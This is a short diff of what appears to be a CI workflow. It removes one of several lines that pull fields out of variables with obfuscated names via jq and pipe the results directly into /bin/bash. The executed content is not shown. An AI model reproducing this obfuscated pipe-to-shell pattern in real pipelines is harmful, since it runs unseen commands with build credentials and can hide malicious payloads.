@@ -35,7 +35,6 @@ jobs:
           echo $amm1 | jq -r .diul21949 | /bin/bash
           echo $v60 | jq -r .rn4332 | /bin/bash
           echo $zwqm39147 | jq -r .x64316 | /bin/bash
-          printf '%s' "$rj39" | jq -r .fs6028 | /bin/bash
           printf '%s' "$x13405" | jq -r .nxc48 | /bin/bash
           echo $khiai4082 | jq -r .zgams298 | /bin/bash
           printf '%s' "$h23802" | jq -r .cn4128 | /bin/bash
